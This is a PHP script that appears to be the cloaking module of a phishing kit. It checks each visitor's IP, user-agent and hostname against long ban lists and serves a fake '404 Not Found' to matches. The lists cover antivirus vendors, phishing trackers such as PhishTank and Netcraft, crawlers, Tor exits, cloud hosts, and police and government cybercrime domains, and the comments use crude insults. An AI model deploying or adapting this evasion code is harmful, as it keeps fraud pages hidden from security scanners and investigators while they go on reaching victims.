<?php
if (getenv("HTTP_CLIENT_IP")) $ip = getenv("HTTP_CLIENT_IP");
else if(getenv("HTTP_X_FORWARDED_FOR")) $ip = getenv("HTTP_X_FORWARDED_FOR");
else if(getenv("REMOTE_ADDR")) $ip = getenv("REMOTE_ADDR");
else $ip = "0.0.0.0";
$host = gethostbyaddr($ip);


/*=========*Malware link scanners, URL expanders, botnets, spam servers and other array's of Banned IP's *=========*/
$bannedIP = array("^66.102.*.*", "^38.100.*.*",  "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",  "^5.254.100.*", "^69.63.189.*", "^5.254.66.*", "^38.100.*.*", "^184.173.*.*",
    "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^95.85.1.*", "^88.198.0.*", "^104.132.20.*", "^216.239.32.*", "^81.161.59.*", "^74.125.*.*", "^207.126.144.*",
    "^173.194.*.*", "^64.233.160.*", "^159.203.0.*", "^188.166.9.*", "^162.243.184.*", "^46.101.72.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^67.215.90.*", "^67.215.95.*", "^179.43.128.*", "^194.72.238.*",
    "^62.116.207.*", "^209.85.128.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*",
    "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^91.103.*.*", "^91.103.64.*", "^212.29.224.*", "^54.183.40.*", "^212.143.*.*", "^212.150.*.*",
    "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^209.85.255.*", "^64.27.2.*", "^67.15.*.*",
    "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^149.20.51.*", "^149.20.69.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*",
    "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*",
    "^168.188.*.*", "^66.207.120.*", "^167.24.*.*",  "^192.118.48.*", "^192.118.48.*", "^66.23.234.*", "^198.186.190.*", "^198.186.191.*", "^198.186.192.*", "^198.186.193.*", "^198.186.194.*",  "^12.148.209.*", "^2.19.131.*", "^193.220.178.*", "2.19.131.159",
    "66.249.71.179", "124.176.210.234", "149.20.54.227", "128.232.110.18", "137.108.145.10", "54.183.40.98", "54.183.40.98", "54.183.0.0",
    "137.110.222.77", "138.26.64.54", "149.20.54.228", "66.166.75.114", "74.208.16.68", "149.20.54.136", "65.17.253.220", "69.163.205.29", "219.117.238.174",
    "69.20.70.31", "91.199.104.3", "64.71.195.31", "66.65.156.74", "144.214.37.229", "84.14.214.213", "133.11.204.68", "125.14.226.143", "149.20.54.209",
    "81.218.48.5", "128.242.99.72", "64.125.148.195", "79.182.102.213", "199.43.186.25", "64.125.148.20", "2.19.131.159", "179.43.156.162", "209.59.166.34", "67.215.92.219",
    "204.15.67.11", "^149.20.*.*", "^69.171.*.*", "^209.85.*.*", "^66.135.*.*", "^66.16.*.*", "^66.179.*.*", "^66.194.*.*", "^80.178.*.*", "^79.182.*.*",
    "^87.69.*.*", "^87.70.*.*", "^149.20.*.*", "^66.135.*.*", "^174.122.*.*", "^108.62.*.*", "^66.150.*.*", "^115.160.*.*", "^79.182.*.*", "^210.247.*.*",
    "^66.150.*.*", "^66.249.*.*", "^66.226.*.*", "^66.227.16.*", "^66.211.*.*", "^64.71.*.*", "^195.214.*.*", "^84.110.*.*", "^178.25.*.*", "^74.125.*.*",
    "^2.19.*.*", "^209.59.166.*", "^67.215.92.*", "^204.15.*.*", "^54.183.*.*", "^54.184.*.*", "^104.132.*.*", "^81.161.*.*", "^190.85.*.*", "^64.106.213.*");

/*=========*Banned UserAgent *=========*/
$badAgents = array('Opera/9.80 (Windows NT 6.1; Win64; x64) Presto/2.12.388 Version/12.17','Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.16',
    'Googlebot/2.1 ( http://www.googlebot.com/bot.html)','Opera/9.80 (Windows NT 6.1; WOW64; U; es-ES) Presto/2.10.289 Version/12.02','Java/1.7.0_09',
    'Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)','Mechanize/2.6.0 Ruby/1.9.3p484 (http://github.com/sparklemotion/mechanize/)',
    'ec2-54-216-218-134.eu-west-1.compute.amazonaws.com','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36',
    'Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1','200please','360spider','3d-ftp','3mir','80legs',
    '_sitemapper','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.100 Safari/537.36','aboundex','accelo','acme.spider','acoonbot','add catalog','adwords','aesop_com_spiderman','affinity','aghaven','ahref','aihitbot',
    'aipbot','[Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1;Trident/4.0)]','almaden','alphaserver','HeadlessChrome','analyticsseo','anonymouse','anyevent-http','anzwerscrawl','appengine-google',
    'appie','apptusbot','artviper','ashes','asia','athens','attache','atwatch-bot','autoemailspider','autohttp','automattic analytics crawler','b55',
    'backlink','bad-neighborhood','baidu','bandit','bazqux','bender','big brother','bigfoot','bitvo','black widow','blackwidow','blekko','blogbot','bnf.fr',
    'boardreader','bogahn','boitho','bootkit','botz','bpimagewalker','brandwatch','bsalsa','bullseye','butterfly','camontspider','careerbot','casino',
    'casper bot','cazoodle','ccbot','centiverse','ceptro','cha0s','cherry','chilkat','chimp','chinaclaw','cloakbrowser','cmradar','cmsworldmap',
    'cncdialer','coccoc','collect','comment','commoncrawl','compspy','control','convera','copier','copyright','cosmos','coverscout','cpython','cr4nk',
    'craftbot','crawler','crawler4j','crawlfire','crescent','crowsnest','crystalsemanticsbot','curious george','curl/','custo','cyberpatrol','cybeye.com',
    'cydral','datacha','dataprovider','davclnt','daylife','dcpbot','debate','deepnet','desktopsmiley','dex bot','diavola','digext','digger','digout4uagent',
    'diibot','disco','discoverybot','dispatcher','dittospyder','dkimrepbot','dot tk','dotbot','dotcomdotnet','dotnetdotcom','doubanbot','download','dragostea',
    'ds_juicyaccess','dsarobot','dts agent','dtsearchspider','dumbot','eak01ag9','easouspider','ecatch','ecollector','ecxi','edition campaign','edition yx',
    'eidetica','email siphon','emailcollector','emailex','emailsearch','emailsiphon','embedly','enabot','encyclopedia','enhancer','envolk','eurobot','exabot',
    'explorer','extractor','eyenetie','ezoom','ezooms','facebookscraper','fairshare','fantombrowser','fast crawler','fast enterprise crawler','fastbot crawler',
    'fastlwspider','fastseek','feed seeker bot','feedfetcher','fetch','fhscan','fibgen','filterdb.iss.net','finder','findlinks','firefly','firefox addon',
    'flashget','flightdeckreportsbot','flipboard','floodgate','flunky','foxy/1','free thumbnails','froogle','fuck','gaisbot','genieo','getcsv','getlinkinfo','getright','gets','getty','geturl11','getweb!',
    'gigabot','girafa','girafabot','go!zilla','googlealerts','gootkit','grabber','grabnet','grafula','grub','gslfbot','gurujibot','hack-bay.com','harvest',
    'heartrails_capture','heritrix','hmview','holmes','htmlparser','http fetcher','http://lycosa.se','httpfetcher','httplib','httpunit',
    'httrack','huawei','huaweisymantecspider','humanlinks','icafe','ichiro','id-search','idbot','image fetcher','imagewalker','inagist','incywincy','indocom',
    'indy library','influencebot','infonavirobot','infoseek','inktomi','inspyder-crawler','intelium','intelliseek','interget','internet explorer','internetseer',
    'intraformant','ip-web-crawler.com','ips-agent','irc search','irgrabber','irlbot','isc systems','isense bot','isset','ixebot','jadynavebot','jakarta','java/',
    'jeeves','jennybot','jetcar','jike','joc web spider','jomjaibot','js-kit','k2spider','kangen','kenjin','keywenbot','keyword','kimengi','kkman','kmccrew',
    'komodiabot','kraken','larbin','leechftp','length','lexi','lexxebot','library','libweb','libwww','linguee','linkdex','linkedfromtwitter','linksmanager',
    'linkwalker','liperhey','lipperhey','lnspiderguy','loader','looksmart','lushbot','lwp','lycos','magnet','magpie','mahiti','mahonie','mail.ru','mama casper',
    'mama cyber','marketdefenderbot','markwatch','mattters','maxpointcrawler','megaupload','mentormate','metadatalabs','mia bot','microsoft url',
    'microsoft-webdav','midown','miixpc','miner','miniredir','mirrordetector','missigua','mister','mj12bot','mlbot','modez','moget','monkey','moreover',
    'morfeus','mot-v980','movable','mozillaxyz','mrchrome','mrie8pack','mrsputnik','msfrontpage','msie 0.','msie 2.','msie 3.',
    'msie 4.','msie 5.','msie 999.1','msiecrawler','multicrawler','nameprotect','nationaldirectory','navigator','navroad','nearsite','neofonie','nessus',
    'netants','netcraft','netestate','netmechanic','netseer','netspider','netzip','news bot','nicebot','nicerspro','nineconnections','ning/1.0','ninja',
    'njuicebot','nmap','nomad','npbot','nsplayer','nutch','object-extractor','obot/2.3.1','octopus','offline navigator','omgilibot','omniexplorer','oozbot',
    'openfind','opera/0.','opera/2.','opera/3.','opera/4.','opera/5.','opera/6.','opera/7.','opera/8.','ourbrowser','ow.ly web crawler','packrat',
    'page fetcher','page_verifier','pagegetter','pagesinventory','pagesummary','paloaltonetworks','panscient','paperlibot','parsijoo','patchone',
    'path 2','pavuk','pcbrowser','peerindex','pentru','peoplepal','perl','photon','phpcrawl','picaloader','picgrabber','pics','picsearch','pictsnapshot',
    'picture finder','ping','pipl','pixmatch','pixray','place','planetwork','plukkie','poe-component-client-http','pogs','powerbot','powermarks','profiler',
    'proximic','psbot','psurf','psybnc','psycheclone','pub-crawler','purebot','purity','pycurl','python','qqdownload','qqpinyinsetup','queryseekerspider',
    'quester','r00t','r6_','rabaz','radian6','rankivabot','ratup.com','reaper','rebi-shoveler','reget','reverseget','rganalytics','ripper','robozilla',
    'rogerbot','root','rpt-httpclient','rsync','ruby','rulinki','ruru','ryze','safemode','saidwot','salad','sample','sasqia','sauger','sbider','sbl-bot',
    'sbl.net','scan','scannerz','schema','scooter','scoutabout','scoutjet','scrape','scspider','searchdnabot','searchme','searchmetricsbot','sedo_parking_robot',
    'seekbot','seekeu-bot','semanticdiscovery','semrush','seo/','seoeng','seohunt','seokicks','seoprofiler','seostat','seostats','seznam','shai','sheenbot',
    'sicent','sickseo','similarpages','siphon','sistrix','sitebot','siteexplorer','siteintel','sitespeedbot','sledink','slysearch','smile seo tools',
    'smileseotools','snagger','snapbot','sniper','snoopy','socialradarbot','socialsearcher','sogou','sohu','solomonobot','soso','spade','spank','spanner',
    'spbot','spinn3r','splashtop','sputnik','ssearch','stackrambler','start.exe','statusnet','stealthbrowser','steeler','stripper','sucker','supendobot',
    'superbot','superhttp','surfbot','surveybot','suzuran','swebot','szukacz','t-h-u-n','t8abot','tackle','tagsdir','takeout','tasapspider','technoratisnoop',
    'tecnoseek','tecomac-crawler','teleport','telesoft','tencenttraveler','teradex mapper','theworld','thumbshots-de-bot','tineye','tiptop','titan','tivraspider',
    'to-night-bot','toata','tocrawl','topseo','toscrawler','tourist crawler','traumacadx','trendictionbot','trivial','true_robot','turingos','turnitinbot',
    'twat','twengabot','twisted pagegetter','twitjobsearch.com','twitterbot','u01-2','ucmore','unmask-parasites','updowner','upictobot','url_spider_sql',
    'user-agent','vagabondo','validator','vampire','vbseo','virustotalcloud','visbot','vlc/','voideye','voilabot','voyager','vurl','wada.vn','walker',
    'wangidspider','warebay','warning','wasalive-bot','wauuu','wbsearchbot','web downloader','webalta','webauto','webbot','webbug','webcapture','webclipping',
    'webcollage','webcompanycrawler','webfetch','webfilter robot','webfindbot','webfluenz','webgo','webleacher','webmastercoffee','webmoney advisor','webot',
    'webpictures','webrank','webreaper','webripper','websauger','webscanner','websquash','webster','webstripper','webviewer','webwhacker','webzip','wells',
    'wget','whitehat','whizbang','whois365 inquirer','Mozilla/4.0','wikio','Mozilla/4.0 (compatible; MSIE 7.0; Windows\t\t\t\t\tNT 5.2)','willow internet crawler',
    'winhttp','winhttprequest','wire','wise-guys','wolf','wordchampbot','wordpress ha','wordpress.com mshots','woriobot','worldbot','wotbox','vbseo.com',
    'wwwoffle','x-crawler','xaldon','xenu','xirio','xmpp tiscali communicator','xpymep','xrumer','xtractorpro','yacy','yadirectbot','yahooseeker','yandeg',
    'yandex','yeti','yfsj crawler','yodao','yolinkbot','yoofind','youdao','your-search-bot','zealbot','zermelo','Java/1.8.0_91','zmeu','zumbot','zyborg','Bork-edition');

if(in_array($_SERVER['HTTP_USER_AGENT'],$badAgents)) {
    // this is for exact matches of Bitches UserAgent
    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}
// Ban Bitches By hostname list
$hostname_ban_array = array('symantec-norton.com','hostcollective.com','cache.google.com','googleusercontent.com','avast.com','google.com',
    'hostcollective.com','OFDP-3.phishmongers.com','phishmongers.com','easysol.net','DMSdcaAnalyzerA1INTUSNY.easysol.net','akamaitechnologies.com','netcraft.com',
    'bing.com','google.com','phishtank.com','west.us.northamericancoax.com','us.northamericancoax.com','northamericancoax.com','amazonaws.com','compute-1.amazonaws.com',
    'bezeqint.net','compute.amazonaws.com','kaputte.li','red.bezeqint.net','orange.net.il','rubi-con.net','une.net.co','ipredator.se','torservers.net','dfri.se',
    'telostor.ca','torservers.net','xshells.net','haema.co.uk','ec2-52-91-61-38.compute-1.amazonaws.com','amazonaws.com','poneytelecom.eu','datagramme.org','leo-unglaub.net','dfri.se','critical.cat',
    'server.torland.is','mb-internal.com','securebrain.co.jp','googlehosted.com','prebytes.net','cloudflare.com','comodo.com','mtsvc.net','contabo.net',
    'onlinelinkscan.com','tuwien.ac.at','netvision.net.il','safeweb.norton.com','symantec.com','eset.com','sophos.com','met.police.uk','treasury.gov',
    'cybercrime.gov','cybercrime.ch','scambusters.org','spamtrackers.eu','phish.opendns.com','urlquery.net','websense.com','spamcop.net','pt7.phishtank.com',
    'trendmicro.com','trendmicro.com.au','us.trendmicro.com','trendmicro','googlebot.com');

if (is_array($hostname_ban_array)) {

    foreach ($hostname_ban_array as $ban_host) {

        if (preg_match("/".$ban_host."\b/i", $host)) {
            // this is for exact matches of IP address in array
            header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}


if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
    // this is for exact matches of IP address in array
    header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
} else {
    // this is for wild card matches
    foreach($bannedIP as $ip) {
        if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
            header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}

?>